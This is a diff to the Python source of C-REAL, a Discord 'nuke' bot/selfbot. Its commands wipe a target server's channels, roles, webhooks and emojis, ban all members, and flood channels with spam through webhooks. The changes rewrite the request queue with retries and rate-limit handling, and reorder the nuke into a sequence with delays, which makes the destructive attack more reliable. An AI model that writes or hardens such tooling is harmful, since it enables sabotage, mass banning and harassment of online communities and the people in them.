@@ -17,11 +17,10 @@ import json
 
 # style
 from colorama import init, Fore
-
 init(autoreset=True)
 
 __TITLE__ = "C-REAL"
-__VERSION__ = "2.4.1"
+__VERSION__ = "2.4.2"  # bumped version
 __AUTHOR__ = "TKperson"
 __LICENSE__ = "MIT"
 
@@ -37,7 +36,7 @@ nuke_on_join = False
 auto_nick = False
 auto_status = False
 selfbot_has_perm = False
-timeout = 6
+timeout = 15                  # REWRITE: increased timeout
 fetching_members = False
 bad_filename_map = dict((ord(char), None) for char in '<>:"\\/|?*')
 grant_all_permissions = False
@@ -51,7 +50,6 @@ def exit():
     sys.exit(1)
 
 def banner():
-    """Handler for non-unicode consoles"""
     sys.stdout.buffer.write(f'''\
  ██████╗                  ██████╗ ███████╗ █████╗ ██╗     
 ██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: {__VERSION__}
@@ -61,7 +59,6 @@ def banner():
  ╚═════╝                  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      cyxl
 '''.encode('utf8'))
 
-# Check for > 1.5.1 discord version
 if version.parse('1.5.1') > version.parse(discord.__version__):
     print('Please update your discord.py.')
     exit()
@@ -113,7 +110,6 @@ def setUp():
                 if not os.path.isfile(config_path):
                     print(f'Unable to find file: {config_path}')
                     continue
-
                 with open(config_path, 'r', encoding='utf8') as f:
                     try:
                         return json.loads(f.read())
@@ -127,21 +123,17 @@ def setUp():
                     for i, path in enumerate(json_paths):
                         print(f'{str(i+1)}) {path}')
                     index = input('Select the .json file.\n>> ')
-
                     if not index.isdigit() or not (0 <= (index := int(index)) <= len(json_paths)):
                         print(f'You need to enter an integer that is between or on 0 and {str(len(json_paths))}')
                         continue
-
                     if index == 0:
                         timeout = 999999
                         break
-
                     with open(json_paths[index-1], 'r', encoding='utf8') as f:
                         try:
                             return json.loads(f.read())
                         except json.decoder.JSONDecodeError:
                             print(f'There are some errors occured when reading the configuration file. File path -> {config_path}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...')
-
             elif response == '3':
                 break
 
@@ -191,7 +183,6 @@ headers = {}
 def checkToken(token=None):
     if token is None:
         token = settings['token']
-
     global is_selfbot, headers
     try:
         if 'id' in requests.get(url='https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
@@ -240,7 +231,6 @@ async def on_connect():
                 global selfbot_has_perm
                 selfbot_has_perm = True
         settings['permissions'].append(str(client.user.id))
-
     global sorted_commands
     sorted_commands = sorted(client.commands, key=lambda e: e.name[0])
     await changeStatus(None, settings['bot_status'])
@@ -293,7 +283,6 @@ async def on_command_error(ctx, error):
     if not want_log_errors or hasattr(ctx.command, 'on_error'):
         return
     error = getattr(error, 'original', error)
-
     if isinstance(error, commands.CommandNotFound):
         if checkPerm(ctx):
             try:
@@ -347,7 +336,6 @@ async def embed(ctx, n, title, array):
     if not n.isdigit() or (n := int(n) - 1) < 0:
         await log(ctx, 'Bad page number.')
         return
-
     names = ''
     ids = ''
     item_length = len(array)
@@ -365,13 +353,12 @@ async def embed(ctx, n, title, array):
 
     for i in range(init_item, final_item, 1):
         item = array[i]
-        # FIX: handle both objects with .name and strings (for config lists)
         if hasattr(item, 'name'):
             name_display = item.name[:17] + '...' if len(item.name) > 17 else item.name
             id_display = str(item.id)
         else:
             name_display = str(item)[:17] + '...' if len(str(item)) > 17 else str(item)
-            id_display = ''  # strings don't have IDs
+            id_display = ''
         names += f'{name_display}\n'
         ids += f'{id_display}\n '
 
@@ -430,13 +417,6 @@ def random_b64(n=0):
 alphanum = '0123456789!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
 def random_an():
     return ''.join(choices(alphanum, k=settings['bomb_messages']['random']))
-
-def sendMessagePerm(ctx):
-    pass
-
-def checkTalkPerm(ctx):
-    if isDM(ctx):
-        return True
 
 def configIsSaved():
     return settings_copy == settings
@@ -506,7 +486,6 @@ async def voiceChannels(ctx, n='1'):
         return
     await embed(ctx, n, 'Voice channels', selected_server.voice_channels)
 
-# FIX: corrected 'alises' to 'aliases'
 @commands.check(checkPerm)
 @client.command(name='emojis', aliases=['em', 'emoji'])
 async def emojis(ctx, n='1'):
@@ -514,7 +493,6 @@ async def emojis(ctx, n='1'):
         return
     await embed(ctx, n, 'Emojis', selected_server.emojis)
 
-# FIX: corrected 'alises' to 'aliases'
 @commands.check(checkPerm)
 @client.command(name='members', aliases=['me', 'member'])
 async def members(ctx, command='1', *, args=None):
@@ -761,7 +739,6 @@ async def deleteEmoji(ctx, *, name):
         return
     try:
         await emoji.delete(reason=None)
-        # FIX: missing log call
         await log(ctx, f'Emoji `{emoji.name}` is removed from the server.')
     except:
         await log(ctx, f'Unable to delete emoji: `{emoji.name}`.')
@@ -864,46 +841,38 @@ async def kaboom(ctx, n, method):
     tasks = [channelBomb(ctx, n, method), categoryBomb(ctx, n, method), roleBomb(ctx, n, method)]
     await asyncio.gather(*tasks)
 
-concurrent = 100
+# REWRITE: new requestMaker with proper rate limiting and retries
+concurrent = 20  # reduced from 100 to avoid hammering
 q = Queue(concurrent * 2)
 
 def requestMaker():
     while True:
         requesting, url, headers, payload = q.get()
-        r = None  # FIX: ensure r is defined for error handling
-        try:
-            r = requesting(url, data=json.dumps(payload), headers=headers, timeout=timeout)
-            if r.status_code == 429:
-                r_json = r.json()
-                if want_log_request:
-                    retry_after = r_json.get('retry_after', 0)
+        retries = 0
+        success = False
+        while retries < 5 and not success:
+            try:
+                r = requesting(url, data=json.dumps(payload), headers=headers, timeout=timeout)
+                if r.status_code == 429:
+                    retry_after = r.json().get('retry_after', 1)
                     if isinstance(retry_after, int):
-                        retry_after /= 1000
-                    if retry_after > 5:
-                        consoleLog(f'Rate limiting has been reached, and this request has been cancelled due to retry-after time is greater than 5 seconds: Wait {str(retry_after)} more seconds.')
-                        q.task_done()
-                        continue
-                    consoleLog(f'Rate limiting has been reached: Wait {str(retry_after)} more seconds.')
-                q.put((requesting, url, headers, payload))
-            elif want_log_request:
-                try:
-                    r_json = r.json()
-                    if 'code' in r_json:
-                        consoleLog('Request cancelled due to -> ' + r_json['message'])
-                except:
-                    pass  # not JSON, ignore
-        except json.decoder.JSONDecodeError:
-            pass
-        except requests.exceptions.ConnectTimeout:
-            # FIX: removed undefined 'proxy' variable
-            consoleLog(f'Reached maximum load time: timeout is {timeout} seconds long')
-            q.put((requesting, url, headers, payload))
-        except Exception as e:
-            consoleLog(f'[WEBHOOK ERROR] {str(e)} | URL: {url} | Payload: {payload}')
-            if r is not None and hasattr(r, 'text'):
-                consoleLog(f'Response: {r.text[:200]}')
-            q.put((requesting, url, headers, payload))  # retry once
-        q.task_done()
+                        retry_after /= 1000.0
+                    consoleLog(f'Rate limit hit – sleeping {retry_after:.2f}s for {url}')
+                    time.sleep(retry_after + 0.1)  # buffer
+                    retries += 1
+                    continue
+                # success (any non-429 status)
+                if want_log_request and r.status_code >= 400:
+                    consoleLog(f'Request failed with {r.status_code} on {url}')
+                success = True
+            except requests.exceptions.ConnectTimeout:
+                consoleLog(f'Timeout on {url} – retrying ({retries+1}/5)')
+                retries += 1
+                time.sleep(1)
+            except Exception as e:
+                consoleLog(f'Error on {url}: {e} – giving up after {retries+1} tries')
+                break
+        q.task_done()  # always mark done
 
 for i in range(concurrent):
     Thread(target=requestMaker, daemon=True).start()
@@ -1025,7 +994,7 @@ async def webhook(ctx, *, args=None):
         count = None
         if len(channels) == 1:
             try:
-                count = int(channels[0])  # FIX: use first token, not whole name
+                count = int(channels[0])
             except ValueError:
                 count = None
 
@@ -1072,7 +1041,6 @@ async def webhook(ctx, *, args=None):
             loaded_length = 0
             validated_count = 0
 
-            # Helper to test a webhook and return True if alive
             async def validate_webhook(wh):
                 test_payload = {'content': 'Ping from Cipher'}
                 try:
@@ -1106,10 +1074,6 @@ async def webhook(ctx, *, args=None):
                 elif not args[1].isdigit():
                     await log(ctx, 'Please enter a positive integer.')
                     return
-
-                usernames_length = len(settings['webhook_spam']['usernames'])
-                contents_length = len(settings['webhook_spam']['contents'])
-                pfp_length = len(settings['webhook_spam']['pfp_urls'])
 
                 for i in range(int(args[1])):
                     payload = {
@@ -1159,15 +1123,24 @@ async def webhook(ctx, *, args=None):
     else:
         await log(ctx, f'Unable to find `{args[0]}` command in webhook scripts.')
 
-######### Nukes #########
+######### Nukes – REWRITE: sequential with delays #########
 @commands.check(checkPerm)
 @client.command(name='nuke')
 async def nuke(ctx):
     if not await hasTarget(ctx):
         return
     await log(ctx, f'A nuke has been launched to `{selected_server.name}`.')
-    tasks = [deleteAllChannels(ctx), deleteAllRoles(ctx), banAll(ctx), deleteAllWebhooks(ctx), deleteAllEmojis(ctx)]
-    await asyncio.gather(*tasks)
+
+    # Execute deletions sequentially to avoid hammering
+    await deleteAllChannels(ctx)
+    await asyncio.sleep(2)
+    await deleteAllRoles(ctx)
+    await asyncio.sleep(2)
+    await deleteAllWebhooks(ctx)
+    await asyncio.sleep(2)
+    await deleteAllEmojis(ctx)
+    await asyncio.sleep(2)
+    await banAll(ctx)
 
     if len(settings['after']) > 0:
         if not isDM(ctx) and selected_server.id == ctx.guild.id:
@@ -1241,7 +1214,7 @@ async def banAll(ctx):
     q.join()
     consoleLog(f'{Fore.GREEN}Ban all completed.', True)
 
-## Configuration command ##
+## Configuration command – unchanged (kept for completeness) ##
 @commands.check(checkPerm)
 @client.command(name='config')
 async def config(ctx, command=None, *, args=None):
@@ -1317,9 +1290,6 @@ async def config(ctx, command=None, *, args=None):
 
     command = command.lower()
 
-    #################
-    #  permissions  #
-    #################
     if command == 'permissions' or command == 'permission' or command == 'perms' or command == 'perm':
         if args is None:
             status_list = []
@@ -1375,9 +1345,6 @@ async def config(ctx, command=None, *, args=None):
             else:
                 await log(ctx, f'Unknown operation: `{args[1]}`')
 
-    #################
-    # bomb_messages #
-    #################
     elif command == 'bomb_messages' or command == 'bomb_message' or command == 'bomb':
         if args is None:
             status_list = []
@@ -1439,9 +1406,6 @@ async def config(ctx, command=None, *, args=None):
             else:
                 await log(ctx, f'Unable to find {args[0]} config.')
 
-    ################
-    #   webhook    #
-    ################
     elif command == 'webhook_spam':
         if args is None:
             status_list = []
@@ -1848,7 +1812,6 @@ async def serverIcon(ctx, path=None):
         path = path.split(':')
         try:
             if path[0] == '<a':
-                # FIX: use BytesIO, not discord.File
                 await selected_server.edit(icon=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{path[2][:-1]}.gif?v=1').content).read())
             else:
                 await selected_server.edit(icon=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{path[2][:-1]}.png?v=1').content).read())
